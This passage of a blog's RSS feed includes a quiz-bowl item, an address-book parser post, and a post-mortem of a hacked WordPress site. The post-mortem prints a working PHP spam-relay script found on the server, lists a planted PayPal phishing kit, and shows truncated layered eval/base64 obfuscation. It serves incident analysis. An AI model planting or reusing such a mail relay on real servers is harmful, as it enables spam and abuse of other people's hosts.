class=&quot;hljs-attribute&quot;&gt;tournament&lt;/span&gt;&quot; : &lt;span class=&quot;hljs-value&quot;&gt;&lt;span class=&quot;hljs-string&quot;&gt;&quot;ACF Nationals&quot;&lt;/span&gt;&lt;/span&gt;, &quot;&lt;span class=&quot;hljs-attribute&quot;&gt;type&lt;/span&gt;&quot; : &lt;span class=&quot;hljs-value&quot;&gt;&lt;span class=&quot;hljs-string&quot;&gt;&quot;qb&quot;&lt;/span&gt;&lt;/span&gt;, &quot;&lt;span class=&quot;hljs-attribute&quot;&gt;year&lt;/span&gt;&quot; : &lt;span class=&quot;hljs-value&quot;&gt;&lt;span class=&quot;hljs-number&quot;&gt;2011&lt;/span&gt; &lt;/span&gt;}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The question thingy&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='livescript'&gt;&lt;/span&gt;&lt;span class=&quot;hljs-comment&quot;&gt;###&lt;/span&gt;
&lt;span class=&quot;hljs-attribute&quot;&gt;tournament&lt;/span&gt;: ACF Nationals
&lt;span class=&quot;hljs-attribute&quot;&gt;year&lt;/span&gt;: &lt;span class=&quot;hljs-number&quot;&gt;2011&lt;/span&gt;
&lt;span class=&quot;hljs-comment&quot;&gt;###&lt;/span&gt;


---
&lt;span class=&quot;hljs-attribute&quot;&gt;difficulty&lt;/span&gt;: Open
&lt;span class=&quot;hljs-attribute&quot;&gt;num&lt;/span&gt;: &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;
&lt;span class=&quot;hljs-attribute&quot;&gt;category&lt;/span&gt;: Literature
&lt;span class=&quot;hljs-attribute&quot;&gt;round&lt;/span&gt;: &lt;span class=&quot;hljs-number&quot;&gt;2011&lt;/span&gt;-ACFNationals-BrownFinal.doc
&lt;span class=&quot;hljs-attribute&quot;&gt;answer&lt;/span&gt;: The {Bronze Horseman}: A Petersburg Tale [accept The Copper Horseman &lt;span class=&quot;hljs-keyword&quot;&gt;or&lt;/span&gt; Mednyy &lt;span class=&quot;hljs-attribute&quot;&gt;vsadnik&lt;/span&gt;: Peterburgskaya povest’]

In a footnote &lt;span class=&quot;hljs-keyword&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt; work, the author claims &lt;span class=&quot;hljs-literal&quot;&gt;that&lt;/span&gt; Mickiewicz’s depiction &lt;span class=&quot;hljs-keyword&quot;&gt;of&lt;/span&gt; the same event as &lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt; work, &lt;span class=&quot;hljs-keyword&quot;&gt;while&lt;/span&gt; beautiful, was inaccurate. This poem opens &lt;span class=&quot;hljs-keyword&quot;&gt;with&lt;/span&gt; a man standing &lt;span class=&quot;hljs-literal&quot;&gt;on&lt;/span&gt; the shore imagining a time &lt;span class=&quot;hljs-keyword&quot;&gt;when&lt;/span&gt; “all flags will visit us/ &lt;span class=&quot;hljs-keyword&quot;&gt;and&lt;/span&gt; we will celebrate &lt;span class=&quot;hljs-keyword&quot;&gt;in&lt;/span&gt; freedom,” after thinking &lt;span class=&quot;hljs-literal&quot;&gt;that&lt;/span&gt; Nature intends &lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt; him &lt;span class=&quot;hljs-keyword&quot;&gt;to&lt;/span&gt; carve a &lt;span class=&quot;hljs-built_in&quot;&gt;window&lt;/span&gt;. This work contains a famous passage expressing the poet’s love &lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt; a city possessed &lt;span class=&quot;hljs-keyword&quot;&gt;of&lt;/span&gt; an “Admiralty needle,” &lt;span class=&quot;hljs-keyword&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt; poem’s protagonist &lt;span class=&quot;hljs-keyword&quot;&gt;is&lt;/span&gt; alleged &lt;span class=&quot;hljs-keyword&quot;&gt;to&lt;/span&gt; have the name he does because the poet &lt;span class=&quot;hljs-keyword&quot;&gt;is&lt;/span&gt; comfortable &lt;span class=&quot;hljs-keyword&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;hljs-literal&quot;&gt;it&lt;/span&gt;, a reference &lt;span class=&quot;hljs-keyword&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;hljs-literal&quot;&gt;that&lt;/span&gt; poet’s earlier work. The protagonist &lt;span class=&quot;hljs-keyword&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt; work sits &lt;span class=&quot;hljs-literal&quot;&gt;on&lt;/span&gt; a marble sentry lion looking at his lover’s house instead &lt;span class=&quot;hljs-keyword&quot;&gt;of&lt;/span&gt; the title character behind him. After the death &lt;span class=&quot;hljs-keyword&quot;&gt;of&lt;/span&gt; his lover Parasha &lt;span class=&quot;hljs-keyword&quot;&gt;in&lt;/span&gt; a flood, &lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt; poem’s protagonist goes mad &lt;span class=&quot;hljs-keyword&quot;&gt;and&lt;/span&gt; wanders the streets before confronting the title figure. For ten points, identify &lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt; poem &lt;span class=&quot;hljs-keyword&quot;&gt;in&lt;/span&gt; which Yevgeniy imagines the title equestrian statue &lt;span class=&quot;hljs-keyword&quot;&gt;of&lt;/span&gt; Peter the Great chasing him through the streets &lt;span class=&quot;hljs-keyword&quot;&gt;of&lt;/span&gt; St. Petersburg, a poem &lt;span class=&quot;hljs-keyword&quot;&gt;by&lt;/span&gt; Alexander Pushkin.
---
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>Outlook Offline Address Book Parser in Python</title>
      <link>http://antimatter15.com/2014/07/outlook-offline-address-book-parser-in-python/</link>
      <pubDate>Tue, 29 Jul 2014 23:23:54 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2014/07/outlook-offline-address-book-parser-in-python/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;div class=&quot;pic md right&quot; style=&quot;width: 300px&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2014/Offline%20Address%20Book/boa-constrictor-medium.jpg&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Look! It&amp;#39;s a snake! To be precise, it&amp;#39;s a Boa photostolenfromnationalgeographae constrictor.&lt;/div&gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Oh Lord, I’m so sorry&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;I once heard a story about a magnificent exhibit at the 1964 World’s Fair— there was a great monument to the synergy of mind, hand, and electromechanical accomplishment— a fully functional 40 foot steel typewriter. &lt;/p&gt;
&lt;p&gt;Children and adults alike would carefully crawl up the giant black injection-molded keys until they reached their favorite letter, at which point they started jumping furiously to activate the spring-loaded key. &lt;/p&gt;
&lt;p&gt;When it finally gave way, they’d sit down and marvel at the thunderous spirit they had awakened. There was a magnificent whiffle tree mechanism which spun a solid metal typeball with such heft that you couldn’t help but imagine whether the Earth itself was the type element of God’s cosmic typewriter— his tool for imprinting the ribbon of time with the ink of fate.&lt;/p&gt;
&lt;p&gt;They called it an I-beam Selectric.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Sometimes you hear a story which involves the confluence of so many strange coincidences, you’re almost certain that it’s all build-up for some colossal letdown of a punchline. &lt;/p&gt;
&lt;p&gt;That’s what the title— “Microsoft Outlook Offline Address Book (OAB) Format Parser in Python” should probably evoke— and if that wasn’t enough, the photo of a BOA Constrictor on the thumbnail should certainly put it over the edge. &lt;/p&gt;
&lt;p&gt;I don’t expect anyone in the world to find a legitimate use of something like this, but I feel obligated to write a blog post anyway. So I’ll write it about the vague subject of bad puns— because I happened to name an OAB parser written in a certain snake-related language an anagram of the format which shares a name with a particular snake-related snake.  &lt;/p&gt;
&lt;!-- 
The timestamp on this post, like probably half of them in 2014 is a lie. I'm actually writing this June 9, 2015— but I have an excuse, well, an excuse which is a bit different from that other excuse that I'm probably employing for literally every other post. 

Up until this year, literally anyone connected to the internet could go to mit.edu and find out the dorm and room number of any student at MIT. In practice it probably doesn't mean much, but it's a violation of certain expectations of privacy. It's been closed now.

That said, I think it would be pretty interesting to visualize the flux of housing migrations, both within dorms and in between them.

I had done it at a somewhat smaller scale after the freshman housing lottery at my dorm, as they had sent out an email to every resident about the new assignments— I just plugged them into Graphviz and got a cool graph. One fun game is searching for the longest cycle (essentially a group of people who happen to have rotated their room ownership). 

But I didn't really want to write a bot which would scrape the web service, and it turns out I didn't have to. MIT uses Outlook Web Access for emails, and there's a feature in Outlook to download the address book offline. That address book happens to include the address information, and it gets stored in the Microsoft Offline Address Book format. 

Why is this part of the post in a comment? I'm not totally sure. 


 --&gt;







</description>
    </item>
    <item>
      <title>Blog Hacked</title>
      <link>http://antimatter15.com/2014/06/blog-hacked/</link>
      <pubDate>Sat, 07 Jun 2014 19:09:52 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2014/06/blog-hacked/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2014/Getting%20Hacked/bw-antimatter15.com-06-2014-http.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;I don&amp;#39;t actually understand what the units of the Y axis are&lt;/div&gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;Well, so my blog got hacked. Even more unfortunate is that I can’t seem to locate any trace of what it looked like when it was hacked. I guess that’s the problem when you write a post-mortem literally a year after the original incident. &lt;/p&gt;
&lt;p&gt;All that’s left is some eerie hints that something happened.&lt;/p&gt;
&lt;p&gt;My blog was averaging around 350MB of bandwidth per day, when suddenly on June 6th, it started to spike. In fact, between June 6th and 7th, it used a total of over 40GB of bandwidth. It had eaten through my entire monthly bandwidth quota. &lt;/p&gt;
&lt;p&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2014/Getting%20Hacked/table.png&quot; &gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;At 6:48pm on June 7th, I had discovered that something was going on with my blog and started the process of fixing it. I looked through some of the access logs and saw a particular abundance of a strange file &lt;code&gt;pffam.php&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='groovy'&gt;&lt;/span&gt;&lt;span class=&quot;hljs-number&quot;&gt;91.234&lt;/span&gt;&lt;span class=&quot;hljs-number&quot;&gt;.164&lt;/span&gt;&lt;span class=&quot;hljs-number&quot;&gt;.143&lt;/span&gt; - - [&lt;span class=&quot;hljs-number&quot;&gt;07&lt;/span&gt;&lt;span class=&quot;hljs-regexp&quot;&gt;/Jun/&lt;/span&gt;&lt;span class=&quot;hljs-number&quot;&gt;2014&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;05&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;07&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;18&lt;/span&gt; -&lt;span class=&quot;hljs-number&quot;&gt;0400&lt;/span&gt;] &lt;span class=&quot;hljs-string&quot;&gt;&quot;POST /wp/wp-content/themes/carrington-woot/pffam.php HTTP/1.1&quot;&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;500&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;7309&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;-&quot;&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;Mozilla/3.0 (compatible; Indy Library)&quot;&lt;/span&gt;
&lt;span class=&quot;hljs-number&quot;&gt;78.26&lt;/span&gt;&lt;span class=&quot;hljs-number&quot;&gt;.204&lt;/span&gt;&lt;span class=&quot;hljs-number&quot;&gt;.99&lt;/span&gt; - - [&lt;span class=&quot;hljs-number&quot;&gt;07&lt;/span&gt;&lt;span class=&quot;hljs-regexp&quot;&gt;/Jun/&lt;/span&gt;&lt;span class=&quot;hljs-number&quot;&gt;2014&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;05&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;07&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;19&lt;/span&gt; -&lt;span class=&quot;hljs-number&quot;&gt;0400&lt;/span&gt;] &lt;span class=&quot;hljs-string&quot;&gt;&quot;POST /wp/wp-content/themes/carrington-woot/pffam.php HTTP/1.1&quot;&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;500&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;7309&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;-&quot;&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;Mozilla/3.0 (compatible; Indy Library)&quot;&lt;/span&gt;
&lt;span class=&quot;hljs-number&quot;&gt;46.173&lt;/span&gt;&lt;span class=&quot;hljs-number&quot;&gt;.111&lt;/span&gt;&lt;span class=&quot;hljs-number&quot;&gt;.151&lt;/span&gt; - - [&lt;span class=&quot;hljs-number&quot;&gt;07&lt;/span&gt;&lt;span class=&quot;hljs-regexp&quot;&gt;/Jun/&lt;/span&gt;&lt;span class=&quot;hljs-number&quot;&gt;2014&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;05&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;07&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;21&lt;/span&gt; -&lt;span class=&quot;hljs-number&quot;&gt;0400&lt;/span&gt;] &lt;span class=&quot;hljs-string&quot;&gt;&quot;POST /wp/wp-content/themes/carrington-woot/pffam.php HTTP/1.1&quot;&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;500&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;7309&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;-&quot;&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;Mozilla/3.0 (compatible; Indy Library)&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Presumably &lt;code&gt;pffam.php&lt;/code&gt; was the bit of malicious code which was injected onto my server, acting as a nice endpoint for recieving and executing particular actions. It seems that &lt;a href=&quot;http://www.indyproject.org/index.en.aspx&quot;&gt;Indy Library&lt;/a&gt; is some sort of .NET library which implements HTTP. &lt;/p&gt;
&lt;p&gt;It’s interesting that the endpoint is being hit by multiple IP addresses, and they all seem to geolocate to Eastern European countries. Presumably they’ve built some sort of graphical Command &amp;amp; Control panel out of Visual Basic or something. &lt;/p&gt;
&lt;p&gt;Unfortunately, it looks like I replaced the entire wordpress installation with an older backup— so I don’t actually have any copies of &lt;code&gt;pffam.php&lt;/code&gt;. But it managed to use 40GB of bandwidth, and hackers are hardly keen on keeping all their eggs in one bucket, so surely there must have been other endpoints— right?&lt;/p&gt;
&lt;p&gt;Sure enough, there’s another endpoint:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='groovy'&gt;&lt;/span&gt;&lt;span class=&quot;hljs-number&quot;&gt;109.87&lt;/span&gt;&lt;span class=&quot;hljs-number&quot;&gt;.224&lt;/span&gt;&lt;span class=&quot;hljs-number&quot;&gt;.22&lt;/span&gt; - - [&lt;span class=&quot;hljs-number&quot;&gt;06&lt;/span&gt;&lt;span class=&quot;hljs-regexp&quot;&gt;/Jun/&lt;/span&gt;&lt;span class=&quot;hljs-number&quot;&gt;2014&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;21&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;18&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;06&lt;/span&gt; -&lt;span class=&quot;hljs-number&quot;&gt;0400&lt;/span&gt;] &lt;span class=&quot;hljs-string&quot;&gt;&quot;POST /ajaxanimator/stick2-old/jsgif/Demos/dswbk.php HTTP/1.1&quot;&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;-&quot;&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;Mozilla/3.0 (compatible; Indy Library)&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And it looks like it was buried underneath enough files that I hadn’t noticed and deleted it— woot? In fact there’s actually a number of fascinating files and folders in that directory&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='sql'&gt;&lt;/span&gt;├── IT2_9z38yd
├── PwdbqQ3nh0
├── SLn30gBqqv
├── SPIFBSYgsr
├── UXLPRmw9YY
├── XviRYdmJ4H
├── baZn0aynkw
├── bosa.php
├── dibdt.php
├── dswbk.php
├── fr1.php
├── hummjvq.php
├── ptRiJiayze
│   ├── VjQauM_3Ev
│   │   ├── btn_bg_sprite.gif
│   │   ├── cv_amex_card.gif
│   │   ├── cv_card.gif
│   │   ├── de-security-hero.png
│   │   ├── form.css
│   │   ├── form.dat
│   │   ├── form.php
│   │   ├── &lt;span class=&quot;hljs-operator&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;help&lt;/span&gt;.jpg
│   │   ├── help2.html
│   │   ├── hr-gradient-sprite.png
│   │   ├── ie6.css
│   │   ├── ie7.css
│   │   ├── ie8.css
│   │   ├── &lt;span class=&quot;hljs-keyword&quot;&gt;index&lt;/span&gt;.css
│   │   ├── &lt;span class=&quot;hljs-keyword&quot;&gt;index&lt;/span&gt;.dat
│   │   ├── &lt;span class=&quot;hljs-keyword&quot;&gt;index&lt;/span&gt;.php
│   │   ├── interior-gradient-bottom.png
│   │   ├── interior-gradient-top.png
│   │   ├── jquery.creditCardValidator.js
│   │   ├── jquery.&lt;span class=&quot;hljs-keyword&quot;&gt;min&lt;/span&gt;.js
│   │   ├── jquery.validationEngine-de.js
│   │   ├── jquery.validationEngine.js
│   │   ├── leftknob.png
│   │   ├── loading.css
│   │   ├── loading.php
│   │   ├── logo_paypal_106x29.png
│   │   ├── &lt;span class=&quot;hljs-keyword&quot;&gt;mid&lt;/span&gt;.swf
│   │   ├── midopt.swf
│   │   ├── mini_cvv2.gif
│   │   ├── nav_sprite.gif
│   │   ├── paypal_logo.gif
│   │   ├── pp_favicon_x.ico
│   │   ├── scr_arrow_4x6.gif
│   │   ├── scr_backgradient_1x250.gif
│   │   ├── scr_content-bkgd.png
│   │   ├── scr_gray-bkgd.png
│   │   ├── scr_gray-bkgd_001.png
│   │   ├── secure_lock_2.gif
│   │   ├── sprite_flag_22x16.png
│   │   ├── sprite_header_footer_94.png
│   │   ├── sprite_ia.png
│   │   ├── sprite_ia_001.png
│   │   ├── validationEngine.jquery.css
│   │   ├── verify
│   │   └── vertical-gradient-sprite.png
│   └── verification
├── sthy.php
├── vlizzvij.php
├── x4MslaR1CW
│   ├── BN3R5U8sF5
│   │   ├── btn_bg_sprite.gif
│   │   ├── cv_amex_card.gif
│   │   ├── cv_card.gif
│   │   ├── de-security-hero.png
│   │   ├── form.css
│   │   ├── form.dat
│   │   ├── form.php
│   │   ├── &lt;span class=&quot;hljs-keyword&quot;&gt;help&lt;/span&gt;.jpg
│   │   ├── help2.html
│   │   ├── hr-gradient-sprite.png
│   │   ├── ie6.css
│   │   ├── ie7.css
│   │   ├── ie8.css
│   │   ├── &lt;span class=&quot;hljs-keyword&quot;&gt;index&lt;/span&gt;.css
│   │   ├── &lt;span class=&quot;hljs-keyword&quot;&gt;index&lt;/span&gt;.dat
│   │   ├── &lt;span class=&quot;hljs-keyword&quot;&gt;index&lt;/span&gt;.php
│   │   ├── interior-gradient-bottom.png
│   │   ├── interior-gradient-top.png
│   │   ├── jquery.creditCardValidator.js
│   │   ├── jquery.&lt;span class=&quot;hljs-keyword&quot;&gt;min&lt;/span&gt;.js
│   │   ├── jquery.validationEngine-de.js
│   │   ├── jquery.validationEngine.js
│   │   ├── leftknob.png
│   │   ├── loading.css
│   │   ├── loading.php
│   │   ├── logo_paypal_106x29.png
│   │   ├── &lt;span class=&quot;hljs-keyword&quot;&gt;mid&lt;/span&gt;.swf
│   │   ├── midopt.swf
│   │   ├── mini_cvv2.gif
│   │   ├── nav_sprite.gif
│   │   ├── paypal_logo.gif
│   │   ├── pp_favicon_x.ico
│   │   ├── scr_arrow_4x6.gif
│   │   ├── scr_backgradient_1x250.gif
│   │   ├── scr_content-bkgd.png
│   │   ├── scr_gray-bkgd.png
│   │   ├── scr_gray-bkgd_001.png
│   │   ├── secure_lock_2.gif
│   │   ├── sprite_flag_22x16.png
│   │   ├── sprite_header_footer_94.png
│   │   ├── sprite_ia.png
│   │   ├── sprite_ia_001.png
│   │   ├── validationEngine.jquery.css
│   │   ├── verify
│   │   └── vertical-gradient-sprite.png
│   └── verification
├── xstyles.php
└── yl27ceCuPh&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;p&gt;So it looks like most of these folders are actually empty, and a lot of the rest of the top level PHP files are the same. &lt;/p&gt;
&lt;p&gt;It seems that &lt;code&gt;bosa.php&lt;/code&gt;, &lt;code&gt;dibdt.php&lt;/code&gt;, &lt;code&gt;dswbk.php&lt;/code&gt;, &lt;code&gt;hummjvq.php&lt;/code&gt;, &lt;code&gt;sthy.php&lt;/code&gt;, and &lt;code&gt;vlizzvij.php&lt;/code&gt; are identical. &lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='bash'&gt;&lt;/span&gt;&amp;lt;?php
&lt;span class=&quot;hljs-variable&quot;&gt;$to&lt;/span&gt;      = stripslashes(&lt;span class=&quot;hljs-variable&quot;&gt;$_POST&lt;/span&gt;[&lt;span class=&quot;hljs-string&quot;&gt;&quot;to_address&quot;&lt;/span&gt;]);
&lt;span class=&quot;hljs-variable&quot;&gt;$BCC&lt;/span&gt;      = stripslashes(&lt;span class=&quot;hljs-variable&quot;&gt;$_POST&lt;/span&gt;[&lt;span class=&quot;hljs-string&quot;&gt;&quot;BCC&quot;&lt;/span&gt;]);
&lt;span class=&quot;hljs-variable&quot;&gt;$subject&lt;/span&gt; = stripslashes(&lt;span class=&quot;hljs-variable&quot;&gt;$_POST&lt;/span&gt;[&lt;span class=&quot;hljs-string&quot;&gt;&quot;subject&quot;&lt;/span&gt;]);
&lt;span class=&quot;hljs-variable&quot;&gt;$message&lt;/span&gt; = stripslashes(&lt;span class=&quot;hljs-variable&quot;&gt;$_POST&lt;/span&gt;[&lt;span class=&quot;hljs-string&quot;&gt;&quot;body&quot;&lt;/span&gt;]);
&lt;span class=&quot;hljs-variable&quot;&gt;$from_address&lt;/span&gt; = stripslashes(&lt;span class=&quot;hljs-variable&quot;&gt;$_POST&lt;/span&gt;[&lt;span class=&quot;hljs-string&quot;&gt;&quot;from_address&quot;&lt;/span&gt;]);
&lt;span class=&quot;hljs-variable&quot;&gt;$from_name&lt;/span&gt; = stripslashes(&lt;span class=&quot;hljs-variable&quot;&gt;$_POST&lt;/span&gt;[&lt;span class=&quot;hljs-string&quot;&gt;&quot;from_name&quot;&lt;/span&gt;]); 
&lt;span class=&quot;hljs-variable&quot;&gt;$contenttype&lt;/span&gt; = &lt;span class=&quot;hljs-variable&quot;&gt;$_POST&lt;/span&gt;[&lt;span class=&quot;hljs-string&quot;&gt;&quot;type&quot;&lt;/span&gt;];


&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; (strlen(&lt;span class=&quot;hljs-variable&quot;&gt;$from_address&lt;/span&gt;) &amp;gt; &lt;span class=&quot;hljs-number&quot;&gt;3&lt;/span&gt;)
{
&lt;span class=&quot;hljs-variable&quot;&gt;$header&lt;/span&gt; = &lt;span class=&quot;hljs-string&quot;&gt;&quot;MIME-Version: 1.0\r\n&quot;&lt;/span&gt;;
&lt;span class=&quot;hljs-variable&quot;&gt;$header&lt;/span&gt; .= &lt;span class=&quot;hljs-string&quot;&gt;&quot;Content-Type: text/&lt;span class=&quot;hljs-variable&quot;&gt;$contenttype&lt;/span&gt;\r\n&quot;&lt;/span&gt;;
&lt;span class=&quot;hljs-variable&quot;&gt;$header&lt;/span&gt; .=  &lt;span class=&quot;hljs-string&quot;&gt;&quot;From: &lt;span class=&quot;hljs-variable&quot;&gt;$from_name&lt;/span&gt; &amp;lt;&lt;span class=&quot;hljs-variable&quot;&gt;$from_address&lt;/span&gt;&amp;gt;\r\n&quot;&lt;/span&gt;;
&lt;span class=&quot;hljs-variable&quot;&gt;$header&lt;/span&gt; .=  &lt;span class=&quot;hljs-string&quot;&gt;&quot;Reply-To: &lt;span class=&quot;hljs-variable&quot;&gt;$from_name&lt;/span&gt; &amp;lt;&lt;span class=&quot;hljs-variable&quot;&gt;$from_address&lt;/span&gt;&amp;gt;\r\n&quot;&lt;/span&gt;;
&lt;span class=&quot;hljs-variable&quot;&gt;$header&lt;/span&gt; .= &lt;span class=&quot;hljs-string&quot;&gt;&quot;Subject: &lt;span class=&quot;hljs-variable&quot;&gt;$subject&lt;/span&gt;\r\n&quot;&lt;/span&gt;;

&lt;span class=&quot;hljs-variable&quot;&gt;$result&lt;/span&gt; = mail(stripslashes(&lt;span class=&quot;hljs-variable&quot;&gt;$to&lt;/span&gt;), stripslashes(&lt;span class=&quot;hljs-variable&quot;&gt;$subject&lt;/span&gt;), stripslashes(&lt;span class=&quot;hljs-variable&quot;&gt;$message&lt;/span&gt;), stripslashes(&lt;span class=&quot;hljs-variable&quot;&gt;$header&lt;/span&gt;));
}
&lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt;
{
&lt;span class=&quot;hljs-variable&quot;&gt;$result&lt;/span&gt; = mail(stripslashes(&lt;span class=&quot;hljs-variable&quot;&gt;$to&lt;/span&gt;), stripslashes(&lt;span class=&quot;hljs-variable&quot;&gt;$subject&lt;/span&gt;), stripslashes(&lt;span class=&quot;hljs-variable&quot;&gt;$message&lt;/span&gt;));
}




&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;hljs-variable&quot;&gt;$result&lt;/span&gt;)
{
&lt;span class=&quot;hljs-built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;'good'&lt;/span&gt;;
}
&lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt;
{
    &lt;span class=&quot;hljs-string&quot;&gt;'error : '&lt;/span&gt;.&lt;span class=&quot;hljs-variable&quot;&gt;$result&lt;/span&gt;;
}
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I’m guessing that it’s being used to send spam messages to different people using the PHP &lt;code&gt;mail()&lt;/code&gt; function. &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;More interesting is &lt;code&gt;fr1.php&lt;/code&gt;, which is obfuscated as a giant base 64 encoded gzipped string. &lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='bash'&gt;&lt;/span&gt;&lt;span class=&quot;hljs-built_in&quot;&gt;eval&lt;/span&gt;(gzinflate(base64_decode(&lt;span class=&quot;hljs-string&quot;&gt;'HZzHkoTKkkQ/591r...h/Pp/jc/L/+59///33f/4f'&lt;/span&gt;)));
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So to see what went inside, I stuck it in a different file and replaced the &lt;code&gt;eval&lt;/code&gt; with &lt;code&gt;echo&lt;/code&gt;. The first time I ran it, I had a bit of a double take because the result looked like this:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='bash'&gt;&lt;/span&gt;&lt;span class=&quot;hljs-built_in&quot;&gt;eval&lt;/span&gt;(gzinflate(base64_decode(&lt;span class=&quot;hljs-string&quot;&gt;'FZ23kuNKtkU/Z+4NGN...gRP6r//+ffff//v/wE='&lt;/span&gt;)));
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And if two times isn’t sufficiently meta, this happens a third&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='bash'&gt;&lt;/span&gt;&lt;span class=&quot;hljs-built_in&quot;&gt;eval&lt;/span&gt;(gzinflate(base64_decode(&lt;span class=&quot;hljs-string&quot;&gt;'FZy3buRaFkU/Z94DA3q...GAfkEQPM8TBK/yP//+++9//w8='&lt;/span&gt;)));
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;A fourth…&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='bash'&gt;&lt;/span&gt;&lt;span class=&quot;hljs-built_in&quot;&gt;eval&lt;/span&gt;(gzinflate(base64_decode(&lt;span class=&quot;hljs-string&quot;&gt;'HZ3HkqPqlkYf554TDPAuO...7fM8QRAFr//+9z///vvv//wf'&lt;/span&gt;)));
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;fifth…&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='bash'&gt;&lt;/span&gt;&lt;span class=&quot;hljs-built_in&quot;&gt;eval&lt;/span&gt;(gzinflate(base64_decode(&lt;span class=&quot;hljs-string&quot;&gt;'FZzHjuNaskU/p+8FB/...qAgCFAAAIIgiYKX8N///Pvvv//3/w=='&lt;/span&gt;)));
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;sixth…&lt;/p&gt;
